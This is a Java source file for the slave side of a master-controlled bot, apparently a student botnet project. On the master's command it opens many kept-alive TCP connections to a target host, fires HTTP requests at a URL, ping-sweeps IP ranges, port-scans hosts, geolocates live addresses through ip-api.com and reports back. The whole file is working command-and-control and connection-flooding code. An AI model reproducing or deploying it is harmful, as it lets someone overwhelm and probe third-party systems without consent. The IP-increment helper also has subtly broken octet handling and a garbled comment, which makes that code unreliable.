/*
 * This runnable class handles connect and disconnect requests from master.
 */

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
//import java.io.ObjectOutputStream;
import java.net.*;
import java.util.ArrayList;
//import java.util.Random;
import java.util.regex.PatternSyntaxException;

public class SlaveRunnable implements Runnable {

	private Socket clientSocket = null;
	private ObjectInputStream ois = null;
	private MasterSlaveProtocol inMessage=null;
	
	//constructors
	public SlaveRunnable(){
		SlaveBot.hostConnections = new ArrayList<HostInfo>();
	}
	public SlaveRunnable(int port, String ip){
		try {
			SlaveBot.hostConnections = new ArrayList<HostInfo>();
			SlaveBot.slaveServer = new ServerSocket(port);
		} catch (IOException e) {
			System.out.println("****** Unable to start slave server on port "+port);
			System.out.println("Creating a server at a new port and sending update message to master");
			try{
				SlaveBot.slaveServer = new ServerSocket(0);
				sendUpdate(port,ip);
				
			}
			catch (IOException ex){
				System.out.println("****** Unable to start slave server. ");
				
			}
			
		}
	}
	
	//START of RUN 
	//Accept incomming master connections and process the request.
	public void run(){

		if(SlaveBot.slaveServer == null){
			
			return;
		}
		try{
			while(true){
				
				clientSocket=SlaveBot.slaveServer.accept();
				ois = new ObjectInputStream(clientSocket.getInputStream());
				inMessage = (MasterSlaveProtocol)ois.readObject();			
				
				if (inMessage!=null){
					
					if(inMessage.GetMessageType()==10){
						System.out.println("Recieved closing command from master");
						System.out.println("****** Exiting slave server");
						if(!SlaveBot.slaveServer.isClosed())
							SlaveBot.slaveServer.close();
						Thread.currentThread().interrupt();
						return;
						
					}
					if(inMessage.GetMessageType()==3){			
						connect(inMessage.GetHost(),inMessage.GetMessage());			
					}
					if(inMessage.GetMessageType()==4){			
						disconnect(inMessage.GetHost());			
					}
					if(inMessage.GetMessageType()==6){
						Thread t = new Thread(new slaveScanCommands(inMessage));
						t.start();						
					}
					if(inMessage.GetMessageType()==8){
						Thread t = new Thread(new slaveScanCommands(inMessage));
						t.start();	
					}
					if(inMessage.GetMessageType()==11){
						Thread t = new Thread(new slaveScanCommands(inMessage));
						t.start();						
					}
				}
				
			}// END of server while
			
		}catch(IOException e){
			e.printStackTrace();
			System.err.println("\n ******Closing server...");
		} catch (ClassNotFoundException e) {			
			e.printStackTrace();
		}
		
	}//END of RUN
	

	// Method to send an update to master
	// Sends the current IP and port number to master.
	private void sendUpdate(int port, String ip) {
		slaveScanCommands temp = new slaveScanCommands();
		MasterSlaveProtocol msg = new MasterSlaveProtocol();
		msg.SetMessageType(0); 
		HostInfo h = new HostInfo(); // updated slave server info
		h.SetIpAddr(SlaveBot.slaveServer.getInetAddress().getHostAddress());
		h.setHostName(SlaveBot.slaveServer.getInetAddress().getHostName());
		h.SetPortNumber(SlaveBot.slaveServer.getLocalPort());
		msg.SetHost(h);
		
		HostInfo s = new HostInfo(); // current slave server info
		s.SetIpAddr(ip);
		s.setHostName(SlaveBot.slaveServer.getInetAddress().getHostName());
		s.SetPortNumber(port);
		msg.SetSlave(s);
		
		temp.SendMessageToMaster(msg);
		
	}// END of sendUpdate

	//Start of Disconnect
	private static void disconnect(HostInfo host) throws IOException{

		
		HostInfo target=GetHost(host.GetIpAddr());
		//Operate only if this slave has active connection to the given host.
		if(target!=null){

			//Disconnect all active connections over a given host IP else disconnect specified IP,port connections. Clear the closed connections from the socket list of the host.
			if(host.GetPortNumber()==-1){
				if(!target.numOfConnections.isEmpty())
					for(Socket connections:target.numOfConnections){
						System.out.println("closing "+connections.getInetAddress().getHostAddress()+":"+connections.getPort()+" at local port "+connections.getLocalPort());
						connections.close();
					}
				target.numOfConnections.clear();
			}						

			else{
				target.CloseConnection(host.GetIpAddr(), host.GetPortNumber());		
			}
		}	
		PrintActiveConncetions();
		
	}//END of disconnect
	

	//Start of Connect
	private static void connect(HostInfo host, String msg) throws IOException{
		
		/*If this slave already has connections to the host then add new connection at the specified IP and port.
		 *Else add the host in the host list of slave and then create new connection to the specified IP and port.
		 */
		try{
			HostInfo target=GetHost(host.GetIpAddr()); // Get a target host if there is an ip match else null
			if(target!=null){
				for(int i=0;i<host.getNumberOfConnections();i++){
					Socket s = new Socket(InetAddress.getByName(host.GetIpAddr()),host.GetPortNumber());
					target.numOfConnections.add(s);
					if(msg.contains("url"))
						SendHTTPRrequest(s,msg);	
					if(msg.contains("keepalive"))
						s.setKeepAlive(true);
					}	
			}		
			else{
				SlaveBot.hostConnections.add(host);	
				target=SlaveBot.hostConnections.get(SlaveBot.hostConnections.size()-1);
				for(int i=0;i<host.getNumberOfConnections();i++){
					Socket s =new Socket(InetAddress.getByName(host.GetIpAddr()),host.GetPortNumber());
					target.numOfConnections.add(s);
					if(msg.contains("url"))
						SendHTTPRrequest(s,msg);
					if(msg.contains("keepalive"))
						s.setKeepAlive(true);
				}	
			}
		
			System.out.println("-created "+host.getNumberOfConnections()+" connection to "+host.GetIpAddr() +" at port "+host.GetPortNumber());
			PrintActiveConncetions();
		}
		catch(UnknownHostException e){
			System.out.println("****** Invalid IP address");
		}
		catch(IllegalArgumentException e){
			System.out.println("****** Invalid port Number");
		}
		catch(NullPointerException e){
			System.out.println("****** IP address cannot be null");
		}
			
	}// END of  Connect
	
		
	//Send a HTTP REQUEST to THE GIVEN URL
	private static void SendHTTPRrequest(Socket s, String msg) throws IOException {

		msg=msg.replace("url=", "");
		
		/*
		if(!msg.contains("#q=")){
			if(msg.charAt(msg.length()-1)=='/')
				msg+="#q="+GenerateRandomString();
			else
				msg+="/#q="+GenerateRandomString();
		}	
		*/	
		URL target;
		try{
			target = new URL(msg);		
			URLConnection c = target.openConnection();		
        	BufferedReader in = new BufferedReader(new InputStreamReader(c.getInputStream()));		
        	String input;                
        	input = in.readLine();        	
        	if(input==null)
        		System.out.println("No reply recieved. URL="+msg);
        	else{	
        		in.close();  
        	}
            if(input.contains("doctype"))
            	System.out.println("-HTTP Request sent on URL="+msg+" \n  and recieved HTML page");
            else{
            	System.out.println("-HTTP request sent on URL="+msg+" \n  and recieved: invalid request page");
            }
		}catch(MalformedURLException e){
			System.out.println("Bad URL: "+msg);
		}
		catch(FileNotFoundException e){
			System.out.println("Bad URL: "+msg);
		}
	}
	
	/*
	//Method to generate random string between length 1-10
	private static String GenerateRandomString(){
        String SALTCHARS = "abcdefghijklmnopqrstuvwxyz";
        StringBuilder salt = new StringBuilder();
        Random rnd = new Random();
        while (salt.length() < rnd.nextInt(10)+1) {
            int index = (int) (rnd.nextFloat() * SALTCHARS.length());
            salt.append(SALTCHARS.charAt(index));
        }
        String saltStr = salt.toString();
        return saltStr;
	}
	*/
	
	//Method to print active connection of slave - currently for test purpose.
	private static void PrintActiveConncetions() throws SocketException {
		
		System.out.println("********* SlaveConnected to: *********");
		for(HostInfo target:SlaveBot.hostConnections){
			
			System.out.println("* "+target.GetActivePorts());
		}
		if(SlaveBot.hostConnections.isEmpty())
			System.out.println("* "+"0 targets.");
		System.out.println("********* END *********");
	}

	//Return the target host from Slave Host list
	private static HostInfo GetHost(String ip){
		HostInfo host=null;
		
		if(!SlaveBot.hostConnections.isEmpty())
			for(HostInfo temp : SlaveBot.hostConnections){
				if(temp.GetIpAddr().equals(ip) ){
					host=temp;		
					break;
				}
			}	
		return host;
	}
	
}//END of SlaveEunnable class


/*
 * This class handles IPSCAN and TCPPORTSCAN commands.
 * The Slave runs these commands in separate threads.
 * */

class slaveScanCommands implements Runnable{

	private MasterSlaveProtocol cmd=null;
	slaveScanCommands(){
	}
	slaveScanCommands(MasterSlaveProtocol msg){
		cmd=msg;
	}
	
	public void run() {
		
		if(cmd.GetMessageType()==6){
			ipScan(cmd.GetHost(),1);
		}
		if(cmd.GetMessageType()==8){
			tcpPortScan(cmd);
		}
		if(cmd.GetMessageType()==11){
			ipScan(cmd.GetHost(),2);
		}
		
	}
	
	
	//ipscan - generate a list of IP addresses that replied to ICMP echo messages within 5 sec and send it to master.
	private void ipScan(HostInfo hostRange, int oprType) {		
		MasterSlaveProtocol ipscanReply = new MasterSlaveProtocol();

		try{
			String ipRange[]=hostRange.GetIpAddr().split("-");;
			String start = ipRange[0];
			String end = ipRange[1];

			if(!validIP(start)){
				System.out.println("****** Invalid Start IP in range\n****** Exiting IP Scan");
				return;
			}
			if(!validIP(end)){
				System.out.println("****** Invalid end IP in range\n****** Exiting IP Scan");
				return;
			}
			
			while(!end.equals(start)){
				
				if(!validIP(start)){
					start=getNextIPV4Address(start);
					continue;
				}
				
				if(ipPing(start)){
					if(oprType==1)
						ipscanReply.scan.add(start);
					else if(oprType == 2)
						ipscanReply.scan.add(start+" "+getHTML("http://ip-api.com/line/"+start));
					
				}				
				start=getNextIPV4Address(start);
				
			}
			if(ipPing(end)){
				if(oprType==1)
					ipscanReply.scan.add(end);
				else if(oprType == 2)
					ipscanReply.scan.add(start+" "+getHTML("http://ip-api.com/line/"+end));
			}
			if(oprType==1)
				ipscanReply.SetMessageType(7);
			else if(oprType == 2)
				ipscanReply.SetMessageType(12);
			SendMessageToMaster(ipscanReply);
			
		}
		catch(ArrayIndexOutOfBoundsException e){
			System.out.println("****** Invalid IP range\n****** Exiting Scan");
			return;
		}
		catch(PatternSyntaxException e){
			System.out.println("****** Invalid IP\n****** Exiting Scan");
			return;
		}
		catch(NumberFormatException e){
			System.out.println("****** Invalid IP\n****** Exiting Scan");
			return;
		}
		catch(Exception e){
			//e.printStackTrace();
			System.out.println("****** Scan could not be performed. Possible error: www.ip-api.com is being blocked on this machine.\n Or this machine's ip address is banned becasue the number of requests breached 150 request per minute limit. To unban goto http://ip-api.com/docs/unban.  \n****** Exiting Scan");
			return;
		}
	

	
	}//END of ipScan
	
	//Method to scan TCP port for a given ip address and send the list of available ports to master.
	private void tcpPortScan(MasterSlaveProtocol in) {
		MasterSlaveProtocol portScanReply = new MasterSlaveProtocol();
		try{
			String portRange[]=in.GetMessage().split("-");;
			int first = Integer.parseInt(portRange[0]);
			int last = Integer.parseInt(portRange[1]);

			for (int i = first; i <= last; i++) {	        	
				if(isReachable(in.GetHost().GetIpAddr(),i,500)){
					portScanReply.scan.add(i+"");
				}
			}
		}
		catch(Exception e){
			System.out.println("****** Invalid Port range");
			System.out.println("****** Exiting Port Scan");
			return;
		}		
		portScanReply.SetMessageType(9);
		SendMessageToMaster(portScanReply);		
	}//END of tcpPortScan method
	
	//Method to send message to master. It create a socket and opens a channel for message passing.
	 void SendMessageToMaster(MasterSlaveProtocol om){
		om.SetSlave(SlaveBot.thisSlave);
		
		try {
			Socket toMaster = new Socket(SlaveBot.master.GetIpAddr(),SlaveBot.master.GetPortNumber());
			ObjectOutputStream o = new ObjectOutputStream(toMaster.getOutputStream());
			ObjectInputStream i = new ObjectInputStream(toMaster.getInputStream());
			MasterSlaveProtocol masterReply = new MasterSlaveProtocol();			
			o.writeObject(om);
			System.out.println("-"+om.GetMessageType(om.GetMessageType())+" message sent to master");
			masterReply =(MasterSlaveProtocol) i.readObject();
			System.out.println("  -"+masterReply.GetMessage());
			toMaster.close();
		} catch (UnknownHostException e) {
			System.err.println("****** Unable to resolve master ip address.");
			//e.printStackTrace();
		} catch (IOException e) {
			System.err.println("****** Unable to create connection to master.");
		} catch (ClassNotFoundException e) {
			System.err.println("****** Unable to recieve message from master.");
		}
		
	}//END if IP Scan
	
	//Method to Ping a given ip using the system supplied ping command.
	private static boolean ipPing(String ip){
	
		boolean ping=true;
		try {		
	        String strCommand = "";
	        if(System.getProperty("os.name").startsWith("Windows")) {
	            // construct command for Windows Operating system
	            strCommand = "ping -n 1 " + ip;
	        } else {
	            // construct command for Linux and OSX
	            strCommand = "ping -c 1 " + ip;
	        }
			Runtime r = Runtime.getRuntime();
			Process process = r.exec(strCommand);
			String pingResult = null;
			BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
		    
		    while ((pingResult = stdInput.readLine()) != null)
		    {
		    	if(pingResult.contains("100.0% packet loss") || pingResult.contains("100% loss") || pingResult.contains("100% packet loss")){
		    		ping=false;
		    	}
		    }
	
		    stdInput.close();
       	} catch (IOException e) {
			return false;
       	}
		return ping;
		
	}//END of ipPing
	
	//isRechable method performs the operation of connection to a given ip and testing if ip address reachable on a port.
	// Its can also be used to test the reachabolity of a port for tcp port scan
	private static boolean isReachable(String addr, int openPort, int timeOutMillis) {	    
	    try {
	        try (Socket soc = new Socket()) {
	            soc.connect(new InetSocketAddress(addr, openPort), timeOutMillis);
	            soc.close();
	        }
	        return true;
	    } catch (IOException ex) {    	
	        return false;
	    }
	}//END of isReachable
	
	
	/*
	 * *Method to generate next Ip address
	 * 10.1.1.0        -> 10.1.1.1
	 * 10.255.255.255  -> 11.0.0.0
1    * 0.0.255.254    -> 10.1.0.0
	 */
	private static String getNextIPV4Address(String ip) {
	    String[] nums = ip.split("\\.");
	    int i = (Integer.parseInt(nums[0]) << 24 | Integer.parseInt(nums[2]) << 8
	          |  Integer.parseInt(nums[1]) << 16 | Integer.parseInt(nums[3])) + 1;

	    // If you wish to skip over .255 addresses.
	    if ((byte) i == -1) i++;

	    return String.format("%d.%d.%d.%d", i >>> 24 & 0xFF, i >> 16 & 0xFF,
	                                        i >>   8 & 0xFF, i >>  0 & 0xFF);
	}
	
	/*Method to generate an HTTP GET request to supplied URL and return the result
	 * Used for http://ip-api.com/csv/a.b.c.d
	 * */
	private static String getHTML(String urlToRead) throws Exception {
	      StringBuilder result = new StringBuilder();
	      int count=0;
	      URL url = new URL(urlToRead);
	      HttpURLConnection conn = (HttpURLConnection) url.openConnection();
	      conn.setRequestMethod("GET");
	      BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
	      String line;
	      while ((line = rd.readLine()) != null) {
		    	 
	    	  if(line.contains("fail")){
	    		  result.append("");
	    		  break;	    		  
	    	  }
	    	  if(count!=0 && count!=2 &&count!=3 && count!=9 && count!=13 && count!=11 && count!=12){
	    		  result.append(line+", ");
	    	  }
	    	  if(count==12){
	    		  result.append(line+"");
	    	  }
	    	  count++;
	      }
	      rd.close();
	      return result.toString();
	   }
	
	
	/*Test if the ip address is valid or not
	 * */
	static boolean validIP (String ip) {
	    try {
	        if ( ip == null || ip.isEmpty() ) {
	            return false;
	        }

	        String[] parts = ip.split( "\\." );
	        if ( parts.length != 4 ) {
	            return false;
	        }

	        for ( String s : parts ) {
	            int i = Integer.parseInt( s );
	            if ( (i < 0) || (i > 255) ) {
	                return false;
	            }
	        }
	        if ( ip.endsWith(".") ) {
	            return false;
	        }

	        return true;
	    } catch (NumberFormatException nfe) {
	        return false;
	    }
	}
	
}//END of slaveScanCommands Thread class


